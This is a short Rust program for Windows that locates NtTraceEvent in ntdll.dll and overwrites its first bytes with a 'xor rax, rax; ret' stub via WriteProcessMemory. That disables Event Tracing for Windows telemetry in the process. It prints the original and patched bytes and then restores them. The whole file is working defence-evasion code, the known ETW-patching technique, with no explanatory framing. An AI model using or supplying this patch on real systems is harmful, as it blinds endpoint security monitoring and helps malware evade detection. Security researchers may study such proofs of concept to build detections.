use std::os::raw::c_void;

use windows_sys::Win32::System::{
    Diagnostics::Debug::WriteProcessMemory,
    LibraryLoader::{GetModuleHandleA, GetProcAddress},
    // Memory::{PAGE_EXECUTE_READWRITE, VirtualProtect},
    Threading::GetCurrentProcess,
};

fn main() {
    unsafe {
        let ntdll = GetModuleHandleA("ntdll.dll\0".as_ptr() as *const u8);

        if ntdll.is_null() {
            println!("[-] Failed to get handle to ntdll.dll");
        }

        println!("[+] Ntdll.dll loaded at {:p}", ntdll);

        let nt_trace_event =
            GetProcAddress(ntdll, "NtTraceEvent\0".as_ptr() as *const u8).unwrap() as *mut c_void;

        if nt_trace_event.is_null() {
            println!("[-] Failed to get address for NtTraceEvent\n")
        }

        println!("[+] NtTraceEvent address: {:p}", nt_trace_event);

        let mut org_bytes: Vec<u8> = Vec::new();
        println!("[!] Original Bytes: ");
        print!("\t");
        for i in 0..10 {
            let byte = *(nt_trace_event.offset(i) as *const u8);
            org_bytes.push(byte);
            print!("{:02X} ", byte);
        }
        print!("\n");

        let patch: [u8; 4] = [
            0x48, 0x33, 0xC0, // xor rax, rax
            0xC3, // ret
        ];

        // let mut old_protect: u32 = 0;
        // if VirtualProtect(
        //     nt_trace_event,
        //     patch.len(),
        //     PAGE_EXECUTE_READWRITE,
        //     &mut old_protect,
        // ) == 0
        // {
        //     println!("Failed to change memory protection\n");
        //     return;
        // }

        let mut bytes_written: usize = 0;
        if !WriteProcessMemory(
            GetCurrentProcess(),
            nt_trace_event,
            patch.as_ptr() as _,
            patch.len(),
            &mut bytes_written,
        ) == 0
        {
            println!("[-] Failed to patch bytes!");
        }

        // if VirtualProtect(nt_trace_event, patch.len(), old_protect, &mut old_protect) == 0 {
        //     println!("[-] Failed to restore memory protection!");
        // }

        println!("[+] Successfully patched NtTraceEvent!");

        println!("[!] Patched Bytes: ");
        print!("\t");
        for i in 0..10 {
            let byte = *(nt_trace_event.offset(i) as *const u8);
            print!("{:02X} ", byte);
        }
        print!("\n");

        println!("[+] Restoring original bytes...");

        let mut bytes_written: usize = 0;
        if !WriteProcessMemory(
            GetCurrentProcess(),
            nt_trace_event,
            org_bytes.as_ptr() as _,
            org_bytes.len(),
            &mut bytes_written,
        ) == 0
        {
            println!("[-] Failed to restore original bytes!");
        }

        println!("[!] Restored Bytes: ");
        print!("\t");
        for i in 0..10 {
            let byte = *(nt_trace_event.offset(i) as *const u8);
            print!("{:02X} ", byte);
        }
        print!("\n");
    }
}
